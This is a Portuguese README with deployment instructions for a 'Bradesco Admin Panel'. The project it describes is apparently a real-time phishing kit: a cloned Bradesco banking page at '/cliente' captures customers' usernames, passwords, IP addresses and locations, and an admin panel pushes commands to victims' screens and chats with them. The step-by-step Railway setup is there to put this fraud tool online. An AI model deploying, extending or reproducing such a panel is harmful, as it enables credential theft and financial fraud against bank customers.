# 🚀 Bradesco Admin Panel - Deploy no Railway

**Status:** ✅ Pronto para Deploy  
**Repositório:** https://github.com/rolimdapires-create/bradesco-admin-panel  
**Data:** 14/05/2026

---

## 🎯 O que é este projeto?

O **Bradesco Admin Panel** é um sistema completo de monitoramento e controle em tempo real com:

- ✅ **Monitoramento em tempo real** de sessões de clientes
- ✅ **Captura de dados** (usuário, senha, IP, localização)
- ✅ **Envio de comandos** para a tela do cliente
- ✅ **Chat bidirecional** entre admin e cliente
- ✅ **Persistência de dados** em MySQL
- ✅ **API tRPC** tipada end-to-end
- ✅ **WebSocket** via Socket.IO para comunicação real-time

---

## 🏗️ Stack Tecnológico

| Camada | Tecnologia |
|--------|-----------|
| **Frontend** | React 19 + Vite + Tailwind CSS |
| **Backend** | Express 4 + tRPC 11 + Socket.IO |
| **Database** | MySQL 8 + Drizzle ORM |
| **Build** | Vite + esbuild |
| **Package Manager** | pnpm 10 |
| **Deployment** | Railway.app |

---

## 📋 Arquivos de Deploy

```
/
├── railway.json              # Configuração Railway (build + deploy)
├── Procfile                  # Comando de inicialização
├── package.json              # Dependências
├── .env.example              # Template de variáveis
├── vite.config.ts            # Config do Vite
├── drizzle.config.ts         # Config do banco de dados
│
├── DEPLOY_RAILWAY_AUTOMATICO.md    # Guia passo-a-passo
├── GUIA_DEPLOY_VISUAL.md           # Guia visual com prints
├── deploy-railway.sh               # Script automático
│
├── client/                   # Frontend React
├── server/                   # Backend Express + tRPC
├── drizzle/                  # Migrations do banco
└── shared/                   # Código compartilhado
```

---

## 🚀 Deploy em 3 Opções

### **Opção 1: Deploy Manual (Recomendado para Iniciantes)**

Siga o guia visual passo-a-passo:
- 📖 Leia: **GUIA_DEPLOY_VISUAL.md**
- ⏱️ Tempo: ~10 minutos
- 📱 Interface: Web do Railway

### **Opção 2: Deploy com Railway CLI**

Use o script automático:
```bash
chmod +x deploy-railway.sh
./deploy-railway.sh
```

Requisitos:
- Node.js instalado
- Railway CLI: `npm install -g @railway/cli`

### **Opção 3: Deploy Automático com GitHub Actions**

Configure CI/CD automático:
- Railway detecta pushes no GitHub
- Build automático a cada commit
- Deploy automático se build passar

---

## 📍 Guia Rápido (5 Minutos)

### 1️⃣ Acessar Railway
```
https://railway.app
```

### 2️⃣ Criar Projeto
- Clique em "New Project"
- Selecione "Deploy from GitHub"
- Escolha: `bradesco-admin-panel`

### 3️⃣ Aguardar Build
- Railway fará build automaticamente
- Tempo: 5-10 minutos

### 4️⃣ Adicionar MySQL
- Clique em "+ Add Service"
- Selecione "MySQL"
- Railway criará banco automaticamente

### 5️⃣ Configurar Variáveis
```
DATABASE_URL=<copie do MySQL>
NODE_ENV=production
JWT_SECRET=<gere: openssl rand -hex 32>
PORT=3000
APP_NAME=Bradesco Admin Panel
```

### 6️⃣ Pronto! 🎉
Sua app estará em: `https://seu-projeto.up.railway.app`

---

## 🔐 Variáveis de Ambiente Necessárias

| Variável | Descrição | Exemplo |
|----------|-----------|---------|
| `DATABASE_URL` | String de conexão MySQL | `mysql://user:pass@host:3306/db` |
| `NODE_ENV` | Ambiente | `production` |
| `JWT_SECRET` | Chave para tokens JWT | `<gere com openssl>` |
| `PORT` | Porta do servidor | `3000` |
| `APP_NAME` | Nome da aplicação | `Bradesco Admin Panel` |

---

## 🌐 Endpoints Disponíveis

| Endpoint | Descrição |
|----------|-----------|
| `/` | Home page |
| `/cliente` | Página clonada do Bradesco |
| `/admin` | Painel administrativo |
| `/api/trpc` | API tRPC |
| `/socket.io` | WebSocket Socket.IO |

---

## 📊 Estrutura do Projeto

```
bradesco-admin-panel/
│
├── client/                          # Frontend React
│   ├── src/
│   │   ├── pages/
│   │   │   ├── AdminPanel.tsx       # Painel do admin
│   │   │   ├── ClienteRedirect.tsx  # Redirecionamento cliente
│   │   │   └── ...
│   │   ├── components/
│   │   ├── hooks/
│   │   └── ...
│   └── public/
│       ├── __bridge__/              # Bridge Socket.IO
│       ├── bradesco_original/       # Assets do Bradesco
│       └── ...
│
├── server/                          # Backend Express
│   ├── _core/
│   │   ├── index.ts                 # Servidor Express + Socket.IO
│   │   ├── socket-handlers.ts       # Handlers Socket.IO
│   │   └── ...
│   ├── routers.ts                   # API tRPC
│   ├── db.ts                        # Queries do banco
│   └── ...
│
├── shared/                          # Código compartilhado
│   ├── types.ts                     # Tipos TypeScript
│   └── ...
│
├── drizzle/                         # Banco de dados
│   ├── schema.ts                    # Definição de tabelas
│   └── migrations/                  # Migrations SQL
│
├── railway.json                     # Config Railway
├── Procfile                         # Startup command
├── package.json                     # Dependências
├── vite.config.ts                   # Config Vite
└── drizzle.config.ts                # Config Drizzle
```

---

## ✅ Checklist de Deploy

Antes de fazer deploy:

- [ ] Repositório GitHub criado ✅
- [ ] Código commitado e pushado ✅
- [ ] `railway.json` presente ✅
- [ ] `Procfile` presente ✅
- [ ] `package.json` válido ✅
- [ ] `.env.example` criado ✅
- [ ] Conta Railway criada
- [ ] GitHub conectado ao Railway
- [ ] MySQL será adicionado após deploy inicial

---

## 🔧 Troubleshooting

### Build falha
```
✓ Verifique se package.json existe
✓ Verifique se railway.json existe
✓ Verifique se Procfile existe
✓ Verifique logs no Railway
```

### App não inicia
```
✓ Verifique DATABASE_URL
✓ Verifique NODE_ENV=production
✓ Veja logs: Railway > Logs
```

### Erro de conexão com banco
```
✓ Aguarde 30 segundos após adicionar MySQL
✓ Copie DATABASE_URL novamente
✓ Reinicie o serviço
```

---

## 📚 Documentação Completa

Para informações detalhadas, consulte:

- **Deploy Passo-a-Passo:** `DEPLOY_RAILWAY_AUTOMATICO.md`
- **Guia Visual:** `GUIA_DEPLOY_VISUAL.md`
- **Documentação Técnica:** `DOCUMENTACAO_COMPLETA.md`
- **Variáveis de Ambiente:** `ENVIRONMENT_VARIABLES.md`
- **Troubleshooting:** `TROUBLESHOOTING_RAILWAY.md`

---

## 🚀 Próximos Passos

1. **Comece com:** https://railway.app
2. **Siga o guia:** `GUIA_DEPLOY_VISUAL.md`
3. **Monitore:** Railway Dashboard
4. **Escale:** Plano pago quando necessário

---

## 📞 Suporte

- **Railway Docs:** https://docs.railway.app
- **Railway Support:** https://railway.app/support
- **GitHub:** https://github.com/rolimdapires-create/bradesco-admin-panel

---

## 🎉 Pronto!

Sua aplicação está pronta para deploy! 🚀

**Comece agora:** https://railway.app

---

**Versão:** 1.0.0  
**Última atualização:** 14/05/2026  
**Status:** ✅ Pronto para Deploy
